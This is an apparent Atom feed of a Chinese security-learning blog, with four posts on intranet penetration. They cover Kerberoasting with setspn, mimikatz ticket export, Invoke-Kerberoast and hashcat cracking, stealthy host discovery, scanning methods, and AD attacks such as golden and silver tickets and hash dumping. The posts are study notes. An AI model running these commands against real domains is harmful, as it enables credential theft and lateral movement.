<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://x1hy9.github.io</id>
    <title>Kimengun的学习之路</title>
    <updated>2021-02-20T10:32:39.870Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://x1hy9.github.io"/>
    <link rel="self" href="https://x1hy9.github.io/atom.xml"/>
    <subtitle>把回忆拼好给你</subtitle>
    <logo>https://x1hy9.github.io/images/avatar.png</logo>
    <icon>https://x1hy9.github.io/favicon.ico</icon>
    <rights>All rights reserved 2021, Kimengun的学习之路</rights>
    <entry>
        <title type="html"><![CDATA[内网渗透中-Kerberos协议中SPN的应用]]></title>
        <id>https://x1hy9.github.io/post/nei-wang-shen-tou-zhong-kerberos-xie-yi-zhong-spn-de-ying-yong/</id>
        <link href="https://x1hy9.github.io/post/nei-wang-shen-tou-zhong-kerberos-xie-yi-zhong-spn-de-ying-yong/">
        </link>
        <updated>2021-02-17T14:14:33.000Z</updated>
        <content type="html"><![CDATA[<h2 id="11-spn">1.1 SPN</h2>
<p>SPN：服务主体名称。使用Kerberos须为服务器注册SPN，因此可以在内网中扫描SPN，快速寻找内网中注册的服务，SPN扫描可以规避像端口扫描的不确定性探测动作。主要利用工具有：setspn、GetUserSPNs.vbs和Rubeus。<br>
a、利用Windows自带的setspn工具，普通域用户权限执行即可：</p>
<blockquote>
<p>setspn -T domain.com -Q <em>/</em></p>
</blockquote>
<p><img src="https://x1hy9.oss-cn-beijing.aliyuncs.com/img/1613562992518-d52fce69-8ae3-4af8-a936-c8a10ac34528.png" alt="" loading="lazy"><br>
在上述截图中可以清晰的看到DCServer机器上运行了dns服务。如果网内存在mssql，利用SPN扫描也可以得到相应的结果。</p>
<h3 id="0x02-spn扫描">0x02 SPN扫描</h3>
<p>spn扫描也可以叫扫描Kerberos服务实例名称，在Active Directory环境中发现服务的最佳方法是通过“SPN扫描”。通过请求特定SPN类型的服务主体名称来查找服务，SPN扫描攻击者通过网络端口扫描的主要好处是SPN扫描不需要连接到网络上的每个IP来检查服务端口。SPN扫描通过LDAP查询向域控制器执行服务发现。由于SPN查询是普通Kerberos票据的一部分，因此如果不能被查询，但可以用网络端口扫描来确认。对域控制器发起LDAP查询，这是正常kerberos票据行为的一部分，因此查询SPN的操作很难被检测</p>
<h4 id="1spn格式">1.SPN格式</h4>
<p>SPN = serviceclass “/” hostname [“:”port] [“/” servicename]<br>
serviceclass = mssql<br>
servicename =sql.bk.com<br>
其中：<br>
serviceclass:标识服务类的字符串，例如Web服务的www<br>
hostname:一个字符串，是系统的名称。这应该是全限定域名（FQDN）。<br>
port:一个数字，是该服务的端口号。<br>
servicename:一个字符串，它是服务的专有名称（DN），objectGuid，Internet主机名或全限定域名（FQDN）。<br>
注意: 服务类和主机是必需参数，但 端口和服务名是可选的，主机和端口之间的冒号只有当端口存在时才需要</p>
<h4 id="2常见服务和spn服务实例名称">2.常见服务和spn服务实例名称</h4>
<p>MSSQLSvc/adsmsSQLAP01.adsecurity.org:1433<br>
Exchange<br>
exchangeMDB/adsmsEXCAS01.adsecurity.org<br>
RDP<br>
TERMSERV/adsmsEXCAS01.adsecurity.org<br>
WSMan / WinRM / PS Remoting<br>
WSMAN/adsmsEXCAS01.adsecurity.org<br>
Hyper-V Host<br>
Microsoft Virtual Console Service/adsmsHV01.adsecurity.org<br>
VMWare VCenter<br>
STS/adsmsVC01.adsecurity.org</p>
<h1 id="ldap协议">LDAP协议</h1>
<p>LDAP全称是Lightweight Directory Access Protocol，轻量目录访问协议。是一种用来查询与更新 Active Directory 的目录服务通信协议。AD 域服务利用 LDAP 命名路径（LDAP naming path）来表示对象在 AD 内的位置，以便用它来访问 AD 内的对象。<br>
搬运daiker大佬文章中LDAP的介绍: <a href="https://www.anquanke.com/post/id/195100?from=singlemessage#h2-1">https://www.anquanke.com/post/id/195100?from=singlemessage#h2-1</a><br>
<img src="https://x1hy9.oss-cn-beijing.aliyuncs.com/img/1613564378225-1078dbe2-6532-44ce-9c2f-5fbffc6d13d2.png" alt="" loading="lazy"></p>
<ul>
<li>目录树：如上图所示，在一个目录服务系统中，整个目录信息集可以表示为一个目录信息树，树中的每个节点是一个条目。</li>
<li>条目：每个条目就是一条记录，每个条目有自己的唯一可区别的名称（DN）。比如图中的每个圆圈都是一条记录。</li>
<li>DN,RDN:比如说第一个叶子条目，他有一个唯一可区分的名称– —</li>
<li>DN:uid=bob,ou=people,dc=acme,dc=org。类似于文件目录的相对路径绝对路径，他除了有个DN之外，还有个RDN，他与目录结构无关，比如之前咱们提过的uid=bob,ou=people,dc=acme,dc=org，他的RDN就是uid=bob</li>
<li>属性：描述条目具体信息。比如 uid=bill,ou=people,dc=acme,dc=org，他有属性name 为bill，属性age为11，属性school 为xx。</li>
</ul>
<figure data-type="image" tabindex="1"><img src="https://x1hy9.oss-cn-beijing.aliyuncs.com/img/1613564376610-ea6dc241-eb73-43e9-9282-5f72091d4fa7.png" alt="" loading="lazy"></figure>
<h1 id="kerberoasting">Kerberoasting</h1>
<p>介绍 Kerberos 的认证流程时说到，在 KRB_TGS_REP 中，TGS 会返回给 Client 一张票据 ST，而 ST 是由 Client 请求的 Server 端密码进行加密的。当 Kerberos 协议设置票据为 RC4 方式加密时，我们就可以通过爆破在 Client 端获取的票据 ST，从而获得 Server 端的密码。<br>
下图为设置 Kerberos 的加密方式为RC4，在域中可以在域控的「本地安全策略」中进行设置：<br>
<img src="https://x1hy9.oss-cn-beijing.aliyuncs.com/img/1613564376496-12278a0b-e71b-4b15-a2de-a7e22282191f.png" alt="" loading="lazy"><br>
设置完成之后运行里输入「gpupdate」刷新组策略，策略生效。</p>
<h2 id="kerberoasting攻击方式一">Kerberoasting攻击方式一</h2>
<p>获得有价值的SPN<br>
需要满足以下条件：</p>
<table>
<thead>
<tr>
<th>该SPN注册在域用户帐户(Users)下域用户账户的权限很高</th>
</tr>
</thead>
<tbody></tbody>
</table>
<p>1.获取SPN<br>
powershell:<a href="https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1">https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1</a><br>
vbs:<a href="https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs">https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs</a></p>
<table>
<thead>
<tr>
<th>1</th>
<th>cscript GetUserSPNs.vbs</th>
</tr>
</thead>
<tbody></tbody>
</table>
<p><img src="https://x1hy9.oss-cn-beijing.aliyuncs.com/img/1613564377810-7553d523-9081-40a6-85cd-640e4a7b04e6.png" alt="" loading="lazy"><br>
2.根据扫描出的结果使用微软提供的类 KerberosRequestorSecurityToken 发起 kerberos 请求，申请 ST 票据。</p>
<table>
<thead>
<tr>
<th>Add-Type -AssemblyName System.IdentityModelNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;MSSQLSvc/Srv-Web-Kit.rootkit.org&quot;</th>
</tr>
</thead>
<tbody></tbody>
</table>
<p><img src="https://x1hy9.oss-cn-beijing.aliyuncs.com/img/1613564377285-96827fe6-b74a-4654-8b79-999772370171.png" alt="" loading="lazy"><br>
3.Kerberos 协议中请求的票据会保存在内存中，可以通过 klist 命令查看当前会话存储的 kerberos 票据。</p>
<table>
<thead>
<tr>
<th>klist</th>
</tr>
</thead>
<tbody></tbody>
</table>
<p><img src="https://x1hy9.oss-cn-beijing.aliyuncs.com/img/1613564377544-e856427d-1eff-44b8-b969-1f99c62eb28e.png" alt="" loading="lazy"><br>
4.mimicatz导出</p>
<table>
<thead>
<tr>
<th>rberos::list /export</th>
</tr>
</thead>
<tbody></tbody>
</table>
<p><img src="https://x1hy9.oss-cn-beijing.aliyuncs.com/img/1613564376510-f9a81a18-3f70-466f-b6ae-9f0f235b6448.png" alt="" loading="lazy"><br>
5.爆破密码<br>
脚本:<a href="https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py">https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py</a></p>
<table>
<thead>
<tr>
<th>python2 tgsrepcrack.py wordlist.txt 1-40a10000-jerry@MSSQLSvc~Srv-Web-Kit.rootkit.org-ROOTKIT.ORG.kirbi</th>
</tr>
</thead>
<tbody></tbody>
</table>
<h2 id="kerberoasting攻击方式二">Kerberoasting攻击方式二</h2>
<p>Kerberoasting攻击方式一中需要通过 mimikatz 从内存中导出票据，Invoke-Kerberoast 通过提取票据传输时的原始字节，转换成 John the Ripper 或者 HashCat 能够直接爆破的字符串。<br>
自动实现，并且不需要mimikatz，普通用户权限即可，参考资料<br>
<a href="http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/">http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/</a><br>
脚本地址：<a href="https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1">https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1</a></p>
<p>| Import-module .\Invoke-Kerberoast.ps1Invoke-kerberoast -outputformat hashcat |fl |<br>
| --- |</p>
<p>–outputformat 参数可以指定输出的格式，可选 John the Ripper 和 Hashcat 两种格式<br>
<img src="https://x1hy9.oss-cn-beijing.aliyuncs.com/img/1613564376663-d8583c68-58ac-49bf-a7ee-4a3b7c0e81e8.png" alt="" loading="lazy"><br>
利用hashcat爆破<br>
工具下载:<a href="https://github.com/hashcat/hashcat">https://github.com/hashcat/hashcat</a></p>
<table>
<thead>
<tr>
<th>hashcat64.exe  -m 13100 hash.txt dic.txt --force --show</th>
</tr>
</thead>
<tbody></tbody>
</table>
<p>hash.txt内容</p>
<table>
<thead>
<tr>
<th>$krb5tgs<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>23</mn></mrow><annotation encoding="application/x-tex">23</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">3</span></span></span></span><em>dbadmin<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>r</mi><mi>o</mi><mi>o</mi><mi>t</mi><mi>k</mi><mi>i</mi><mi>t</mi><mi mathvariant="normal">.</mi><mi>o</mi><mi>r</mi><mi>g</mi></mrow><annotation encoding="application/x-tex">rootkit.org</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">o</span><span class="mord mathdefault">o</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault">i</span><span class="mord mathdefault">t</span><span class="mord">.</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span></span></span></span>MSSQLSvc/Srv-Web-Kit.rootkit.org:1433</em>$d78f3a872b2e770bd7fed0a08386d791$2a356ecded8ad719cde070eb0c25bd1126dce5017acfb219135760a3890428da51667504789cb12c15fa61c71209ffc3ed0cd1d7e08cbeb4bb2bbc84d42bac53f4030bbf8fff011bcfcd76e2448f8b34f1431da0ba5f373c737d12004562b4242b099c2f27797cd682902f70f356f5fa629ea7c55458ebd230eaa19c56f596e1e1e6e2d37887bddca6243661c3d1d8e69420a3ab4427c56859d3858f6b4283fc268a1f4af161771d37858226a4d640f0cb45648760d7c5698cfbcc1e53003277e462937d09da38e8c1bfd698e6d6db5fc184fa9166c5bf8002cb061b53187612d597ad3a547b4a2b6cd474bcb894c6d1ff021299882dd4ba9d37fe5543bbb205b5941cb24891f3f1733dd012dda97a81d8cb0206bfca3b9ae8a0087466fb91b1bea820a3608f71eb90a50d46ca1944816242d75ddae569cdf33bad5fb8f5703c252dbfce22cfa8ab268d16671020044282f88119854a01500216364329e89b37367516d0f21f9d2f6b20b886e3a01424b90431ffc7782a21a6befe40514cdfb704c29a2bd25078e821209d914df46fb11c997c7cf9e0ec94c036466cd51351c132304ff8a2bbdd8120a955b7ef764169193c8915dc123d6c339a5c2d7bae301f0effdaaa604cc84a4f36f005bbbf64f1cb276b265fc953e7b3c09cdbc4ec102edd8907fcf812088e7ab7ab1d3d1efe07c899f9f590ee1a8fa7714e5b5e7b82b072aa46dae2bf9566cca99877932021b506ddb51e3162a576e155ff0c40e6eb1546b7713d355475c4df227864e4a3e7d12c3c0d6f1020f738b041c4717aa626ef8a3c9974bda28f2d058dfc2a90bd6aea7a6352c07999744e9b936b34b372ffd85153bec7ea17c80cab0ab0f165b638fc43917df16c8dc37d664d952cb615bbf95809bcc046761cefc39eb01b2b0160d31701ed33f3d9ffafafbf931c3f698ab57550da5fb50b009aa27e1dcb3fdfcf9d68b44882b065dedb15252c3762b2ff98c197e87f4a04831ed8dda78e71a9744a655fde06064a8a7b19caa0845436ceadc279e3d50fb21982d9303f96470705f85f4ab1544d54f2a39f98fc5bcab97ad124b7aeffb45ccb356c043ee2949bdffb1fe0607b608051bc300b736d1add8f2cf50f508fe8b3e624f1d512cff8ed1f894a2836ea9fc960c5a87933f793a1f059f51d640353e01eedfaf5b41a60ba2b779d7e27e29d83fc584cb3ad7c52d746c1fd1d8b38840d3533e9ab0dc96110d509ab41735253a3354c3bcaa97acde9f6f2d9abe6ca1cea1e4b9df500b0567215571d8360f5f55b1dda171c2db476e2888eee7dfefb9a22909729350a4307d1f606a5ddb615a29ea3b54194f216f92c2161e3d998044c811675e86f913140e0e2d290da20141a9fe488ea715c1562f6425e30b54261e44b8e83430456c2b11e08d227b209f4c992089d8ac633e59d0ccbe15e5c06</th>
</tr>
</thead>
<tbody></tbody>
</table>
<p>爆破结果<br>
<img src="https://x1hy9.oss-cn-beijing.aliyuncs.com/img/1613564376692-eef989aa-ad92-4f35-b711-836e51824235.png" alt="" loading="lazy"><br>
**</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[内网渗透主机发现技巧]]></title>
        <id>https://x1hy9.github.io/post/nei-wang-shen-tou-zhu-ji-fa-xian-ji-qiao/</id>
        <link href="https://x1hy9.github.io/post/nei-wang-shen-tou-zhu-ji-fa-xian-ji-qiao/">
        </link>
        <updated>2021-02-17T11:05:34.000Z</updated>
        <content type="html"><![CDATA[<p><img src="https://x1hy9.github.io/post-images/1613559951955.jpg" alt="" loading="lazy"><br>
当我们拿到一台主机准备横向移动的时候我们需要做以下这些事情这样会比较快速的定位到内网中存活的其他主机</p>
<h3 id="确定ip段">确定IP段</h3>
<p>通常内网地址分三段：10.0.0.0/8、172.16.0.0/12以及192.168.0.0/16。在没有做任何操作之前，我们可以大概知道内网的IP地址段，不过也有些公司，在内网又会有公网IP的情况，也就是说在内网中可以访问到的IP段有很多。</p>
<hr>
<p>下面就主要介绍一下收集IP段的方式。</p>
<h4 id="查看本机的ip地址">查看本机的IP地址</h4>
<p>Windows下使用：</p>
<pre><code>ipconfig /all
</code></pre>
<p>Linux下使用：</p>
<pre><code>ifconfig -a
</code></pre>
<p>以Windows为例，执行结果如图：</p>
<figure data-type="image" tabindex="1"><img src="https://x1hy9.oss-cn-beijing.aliyuncs.com/img/1613558797342-57674478-4de2-4bef-a0fa-ad30807b9fa6.png" alt="" loading="lazy"></figure>
<p>从图中看到，我本机的IP以及下面的子网掩码，可以说明我所在的IP段是一个C段，我们就可以首先探测一下我所处的IP段，即：192.168.188.0/24。<br>
图中还有一个IP值得注意，就是dns服务器的IP，通常在内网中，DNS服务器的IP地址未必与我们在同一个C段或者B段，所以从这里也可以看到一个存在的IP段，也是我们要做主机发现扫描的目标IP段。</p>
<hr>
<h4 id="查看路由表">查看路由表</h4>
<p>Windows下使用：</p>
<pre><code>route print
</code></pre>
<p>linux下使用：</p>
<pre><code>route -n
</code></pre>
<p>以Windows为例，结果如图：<br>
<img src="https://x1hy9.oss-cn-beijing.aliyuncs.com/img/1613558898133-c1150abd-644f-48be-b3df-6f86745b4d21.png" alt="" loading="lazy"></p>
<p>在上图可以看出，在路由表中也存在我们上面确定的IP段，这是我自己家的网络，所以没有那么复杂，大家在实际环境或者公司网络中可以看到有多个IP段，这些IP段都是我们可以访问到的，也是要做主机发现扫描的目标IP段。</p>
<hr>
<h4 id="查看本地连接信息">查看本地连接信息</h4>
<p>Windows下执行：</p>
<pre><code>netstat -ano
</code></pre>
<p>linux下执行：</p>
<pre><code>netstat -anp
</code></pre>
<p>以Windows为例执行结果如图：</p>
<figure data-type="image" tabindex="2"><img src="https://x1hy9.oss-cn-beijing.aliyuncs.com/img/1613559569352-d4fca6a0-07be-46f4-adcf-ad90b0b7b048.png" alt="" loading="lazy"></figure>
<p>从图中看到有很多的IP连接信息，我们并没有看到内网的IP地址，那是因为内网没有主机与我这台主机相连，你想象一下，如果我这台主机是台服务器，那么内网用户访问服务器时必定会有连接出现，这也是我们收集内网IP段信息的一种方式。</p>
<hr>
<h4 id="利用net命令">利用net命令</h4>
<p>我们知道，在Windows内网环境下，我们可以使用</p>
<pre><code>net view
</code></pre>
<p>命令用于显示一个计算机上共享资源的列表。我们从这个资源列表可以获取到一些主机名，然后解析出IP地址，这样不光收集到了一些存活主机，而且还收集了一些IP段。由于没有环境，就盗用网络上的图来填补一下：</p>
<hr>
<p>我们还可以使用</p>
<pre><code>net session
</code></pre>
<figure data-type="image" tabindex="3"><img src="https://x1hy9.oss-cn-beijing.aliyuncs.com/img/1613559659841-539c133e-0c77-45e8-a9a8-bbefe1316061.png" alt="" loading="lazy"></figure>
<p>命令来查看管理员的登录IP，linux下可以使用</p>
<pre><code>who
</code></pre>
<h4 id="利用dns信息">利用dns信息</h4>
<p>当我们进入内网的时候，第一时间，我们应该先探测一下内网的dns服务是否存在dns域传送漏洞，如果存在，我们就可以剩下很多时间并且可以获取非常全的域名列表，这个列表基本很全的包含了内网所有的存活主机。如何探测dns域传送<a href="http://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;mid=2247483722&amp;idx=1&amp;sn=0ca58973b1257a410ff13111134da931&amp;chksm=ec1e3162db69b87461b7d881cc43384afa2f2a41a5d529f5ad7dc13eddfee70ad4e9136ecef5&amp;scene=21#wechat_redirect">请点我</a>。</p>
<p>如果不存在dns域传送漏洞，在我们收集了一定的主机名之后，我们可以根据主机名的命名规则生成一份主机名字典，然后使用dns解析这些名字，获得IP之后，再根据IP确定IP段。</p>
<h4 id="利用域信息">利用域信息</h4>
<p>如果我们已经获取到一台域内的主机权限，那么我们就可以访问域内的所有信息，这是就可以通过域控制器查询加入域中的所有主机信息，可以使用如下命令获取：</p>
<p>dsquery computer 以及 dsquery server</p>
<p>获得主机以及服务器列表后，解析其IP获取IP段信息。</p>
<hr>
<p>用以上几种方式，在新获取到一台主机权限之后做一下这个处理，就可能会收集到更多的IP段。但是有人说了，这样做多累啊，直接使用Namp或者其他大型扫描器多线程扫描内网的所有IP段不就行了，这样做当然可以，但是这个动静多大，会造成各种安全设备报警，还没赶上进一步渗透，你就直接game over了。老板给的任务完不成了，奖金没了~~~~</p>
<p>在内网的活动要非常谨慎，动静越小越好，否则，这篇文章的意义何在？</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[内网存活主机探测]]></title>
        <id>https://x1hy9.github.io/post/nei-wang-cun-huo-zhu-ji-tan-ce/</id>
        <link href="https://x1hy9.github.io/post/nei-wang-cun-huo-zhu-ji-tan-ce/">
        </link>
        <updated>2021-02-16T08:21:34.000Z</updated>
        <content type="html"><![CDATA[<p><img src="https://x1hy9.oss-cn-beijing.aliyuncs.com/img/1613456768575-62e60b8e-5e77-472c-9069-aaa6eab4b57d.jpeg" alt="" loading="lazy"><br>
我们将主机扫描的场景大致可分为三种<br>
1）直接在webshell下执行，通过系统自带命令或上传脚本工具进行扫描探测<br>
2）通过反弹shell进行内网渗透，msf等<a href="https://www.77169.net/dhxz">渗透测试</a>框架自带一些扫描模块<br>
3）通过socks代理扫描内网（例如 proxychains+Nmap扫描）。<br>
支持存活探测的协议，包括了 ARP、ICMP、SMB、 UDP、NETBIOS、SNMP协议<br>
支持端口扫描的方式，包括ACK扫描、SYN扫描、TCP扫描、UDP扫描、ICMP扫描</p>
<h2 id="存活主机探测">存活主机探测</h2>
<h3 id="0x01-netbios协议探测">0x01 Netbios协议探测</h3>
<h4 id="11-netbios简介">1.1 netbios简介</h4>
<p>IBM公司开发，主要用于数十台计算机的小型局域网。该协议是一种在局域网上的程序可以使用的应用程序编程接口（API），为程序提供了请求低级服务的同一的命令集，作用是为了给局域网提供网络以及其他特殊功能。系统可以利用WINS服务、广播及Lmhost文件等多种模式将NetBIOS名-——特指基于NETBIOS协议获得计算机名称——解析为相应IP地址，实现信息通讯，所以在局域网内部使用NetBIOS协议可以方便地实现消息通信及资源的共享</p>
<h3 id="0x02-icmp协议探测">0x02 ICMP协议探测</h3>
<h4 id="21-icmp简介">2.1 ICMP简介</h4>
<p>它是TCP/IP协议族的一个子协议，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。这些控制消息虽然并不传输用户数据，但是对于用户数据的传递起着重要的作用。</p>
<h3 id="0x03-udp协议探测">0x03 UDP协议探测</h3>
<h4 id="31-udp简介">3.1 UDP简介</h4>
<p>UDP（User Datagram Protocol）是一种无连接的协议，在第四层-传输层，处于IP协议的上一层。UDP有不提供数据包分组、组装和不能对数据包进行排序的缺点，也就是说，当报文发送之后，是无法得知其是否安全完整到达的。</p>
<h3 id="0x04-arp协议探测速度快好用">0x04 ARP协议探测(速度快，好用)</h3>
<h4 id="41-arp简介">4.1 ARP简介</h4>
<p>ARP,通过解析网路层地址来找寻数据链路层地址的一个在网络协议包中极其重要的网络传输协议。根据IP地址获取物理地址的一个TCP/IP协议。主机发送信息时将包含目标IP地址的ARP请求广播到网络上的所有主机，并接收返回消息，以此确定目标的物理地址<br>
这个东西是个广播请求，通俗来讲相当于我这边像域内主机发送广播，在说谁的ip是xxxxxx，每个主机都能听到然后如果不是自己的ip就无视掉，如果是的话这个主机就会喊，我的ip是这个，我的mac地址是xxxxxx，然后攻击机就能获取ip是否有主机存活了</p>
<figure data-type="image" tabindex="1"><img src="https://x1hy9.oss-cn-beijing.aliyuncs.com/img/1613460066177-b4945d85-c664-4f2c-88c1-6a03e105f40c.png" alt="" loading="lazy"></figure>
<h3 id="0x05-snmp协议探测">0x05 SNMP协议探测</h3>
<h4 id="51-snmp简介">5.1 SNMP简介</h4>
<p>SNMP是一种简单网络管理协议，它属于TCP/IP五层协议中的应用层协议，用于网络管理的协议。SNMP主要用于网络设备的管理。SNMP协议主要由两大部分构成：SNMP管理站和SNMP代理。SNMP管理站是一个中心节点，负责收集维护各个SNMP元素的信息，并对这些信息进行处理，最后反馈给网络管理员；而SNMP代理是运行在各个被管理的网络节点之上，负责统计该节点的各项信息，并且负责与SNMP管理站交互，接收并执行管理站的命令，上传各种本地的网络信息。</p>
<h3 id="0x06-smb协议探测">0x06 SMB协议探测</h3>
<h4 id="61-smb简介">6.1 SMB简介</h4>
<p>直接通过扫描445或者139端口来探测主机是否存活，总归还是TCP/IP协议的东西这里就不多描述了</p>
<h2 id="端口探测">端口探测</h2>
<h3 id="0x01-tcp扫描">0x01 TCP扫描</h3>
<p>这是一种最为普通的扫描方法，这种扫描方法的特点是：扫描的速度快，准确性高，对操作者没有权限上的要求，但是容易被防火墙和IDS(防入侵系统)发现<br>
运行的原理：通过建立TCP的三次握手连接来进行信息的传递<br>
① Client端发送SYN；<br>
② Server端返回SYN/ACK，表明端口开放；<br>
③ Client端返回ACK，表明连接已建立；<br>
④ Client端主动断开连接。<br>
<img src="https://x1hy9.oss-cn-beijing.aliyuncs.com/img/1613461779741-5fa229d0-ec12-4e4c-83bf-ca6bb8e49682.jpeg" alt="" loading="lazy"></p>
<h3 id="0x02-syn扫描">0x02 SYN扫描</h3>
<p>这是一种秘密的扫描方式之一，因为在SYN扫描中Client端和Server端没有形成3次握手，所以没有建立一个正常的TCP连接，因此不被防火墙和日志所记录，一般不会再目标主机上留下任何的痕迹，但是这种扫描是需要root权限（对于windows用户来说，是没有root权限这个概念的，root权限是linux的最高权限，对应windows的管理员权限）<br>
运行的原理图如下：<br>
<img src="https://x1hy9.oss-cn-beijing.aliyuncs.com/img/1613461779758-2b7ee987-a61e-4991-a2f3-c988c86e11a2.jpeg" alt="" loading="lazy"></p>
<h3 id="0x03-ack扫描">0x03 <strong>ACK扫描</strong></h3>
<p>ACK扫描的原理是发送一个ACK包给目标主机，不论目标主机的端口是否开启，都会返回相应的RST包，通过判断RST包中的TTL来判断端口是否开启<br>
运行原理图：<br>
<img src="https://x1hy9.oss-cn-beijing.aliyuncs.com/img/1613461830403-1fddce24-8c1b-4add-8533-6d6ef9b6f68e.jpeg" alt="" loading="lazy"></p>
<p>TTL值小于64端口开启，大于64端口关闭<br>
大致上主要的扫描方法就是这些，除了我们可以按照这样些参数去执行扫描外，还可以自己定义一个TCP扫描包</p>
<h3 id="0x04-udp扫描">0x04 UDP扫描</h3>
<p>UDP扫描比较简单，一般如果返回<code>ICMP port unreachable</code>说明端口是关闭的，<br>
而如果没有回应或有回应(有些UDP服务是有回应的但不常见)则认为是<code>open</code>，但由于UDP的不可靠性，无法判断报文段是丢了还是没有回应，<br>
所以一般扫描器会发送多次，然后根据结果再判断。这也是为什么UDP扫描这么慢的原因。</p>
<h3 id="0x05-icmp扫描">0x05 ICMP扫描</h3>
<p>根据网络协议，如果按照协议出现了错误，那么接收端将产生一个icmp的错误报文。这些错误报文并不是主动发送的，而是由于错误，根据协议自动产生<br>
<img src="https://x1hy9.oss-cn-beijing.aliyuncs.com/img/1613463336747-e8486fde-fdf1-4829-be71-26c48bf0e2b3.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[内网基本知识点总结]]></title>
        <id>https://x1hy9.github.io/post/nei-wang-ji-ben-zhi-shi-dian-zong-jie/</id>
        <link href="https://x1hy9.github.io/post/nei-wang-ji-ben-zhi-shi-dian-zong-jie/">
        </link>
        <updated>2021-02-15T10:58:32.000Z</updated>
        <content type="html"><![CDATA[<h2 id="ad活动目录-dc指域控制器">AD（活动目录） DC（指域控制器）</h2>
<p>相当于一个组件具有以下功能</p>
<ul>
<li>服务器及客户端计算机管理</li>
<li>用户服务</li>
<li>资源管理</li>
<li>桌面配置</li>
<li>应用系统支撑</li>
</ul>
<h3 id="攻击ad">攻击AD</h3>
<ul>
<li>利用常规Web渗透进行横向渗透</li>
<li>常规Dump Hash后进行PTH，循环操作，直到获取Domain Admins</li>
<li>利用SYSVOL和组策略首选项(GPP)</li>
<li>MS14-068</li>
<li>利用VSS卷影副本拷贝ntds.dit</li>
<li>利用Responder等工具进行ARP</li>
<li>Netbios和LLMNR命名投毒</li>
<li>kerberoast(破解Ticket)</li>
<li>MS17-010</li>
</ul>
<h2 id="kerberos协议">Kerberos协议</h2>
<p>用来认证的一种协议<br>
有以下四种</p>
<h3 id="协议内容">协议内容</h3>
<ul>
<li>AS：认证服务器</li>
<li>KDC：密钥分发中心</li>
<li>TGT：票据授权票据，票据的票据</li>
<li>TGS：票据授权服务器</li>
</ul>
<h3 id="认证过程">认证过程</h3>
<ul>
<li>用户先向KDC(是一种认证服务一般安装在域控中)发送请求验证自己是域内的机器</li>
<li>KDC确认用户并向用户发送凭证</li>
<li>用户向KDC发送网络服务访问请求凭证</li>
<li>KDC给用户发送网络服务访问凭证</li>
<li>用户使用网络服务凭证访问相应的网络服务</li>
<li>网络服务器确认网络服务凭证有效并向用户提供网络服务</li>
</ul>
<figure data-type="image" tabindex="1"><img src="https://x1hy9.oss-cn-beijing.aliyuncs.com/img/20210215180336.png" alt="" loading="lazy"></figure>
<p>有两种攻击方式</p>
<h3 id="黄金票据">黄金票据</h3>
<p>这种是通过直接伪造身份认证直接跳过3，4认证，相当于直接伪造TGT<br>
每个用户的Ticket都是由krbtgt的密码Hash来生成的，那么，我们如果拿到了krbtgt的密码Hash，其实就可以伪造任意用户的TICKET<br>
不过需要和dc交互</p>
<pre><code>1、域名称            
2、域的SID值
3、域的KRBTGT账户密码HASH
4、伪造用户名，可以是任意的
</code></pre>
<h3 id="白银票据">白银票据</h3>
<p>这种是通过直接伪造服务认证直接跳过5认证，因为在TGT已经在PAC里限定了给Client授权的服务（通过SID的值），所以银票只能访问指定服务</p>
<pre><code>1.域名称
2.域的SID值
3.域中的Server服务器账户的NTLM-Hash
4.伪造的用户名，可以是任意用户名.
5.目标服务器上面的kerberos服务
</code></pre>
<h2 id="ntlm协议">NTLM协议</h2>
<p>域渗透涉及到的技术，如哈希传递（PTH）票据传递（PTT）委派攻击等，都是基于域环境下的认证机制来实现的，这也是为什么要了解Windows认证机制的原因之一<br>
NTML分为两种认证一种是本地认证一种是网络认证</p>
<h3 id="本地认证">本地认证</h3>
<p>系统收到输入的密码进行如下操作</p>
<pre><code>用户密码-&gt;HEX编码-&gt;Unicode编码-&gt;MD4
</code></pre>
<p>然后与sam数据库（%SystemRoot%\system32\config\sam）中该用户的哈希比对，匹配则登陆成功，不匹配则登陆失败<br>
本地认证中用来处理用户输入密码的进程即lsass.exe,密码会在这个进程中明文保存，供该进程将密码计算成NTLM Hash与sam进行比对<br>
在渗透测试中，通常可从Windows系统中的SAM文件和域控的NTDS.dit文件中获得所有用户的hash，通过Mimikatz读取lsass.exe进程能获得已登录用户的NTLM hash</p>
<h3 id="网络认证">网络认证</h3>
<p>Net NTLM的认证过程分为三步，也叫挑战响应机制：</p>
<ol>
<li>协商</li>
<li>挑战</li>
<li>验证</li>
</ol>
<p>协商：主要用于确认双方协议版本、加密等级等。<br>
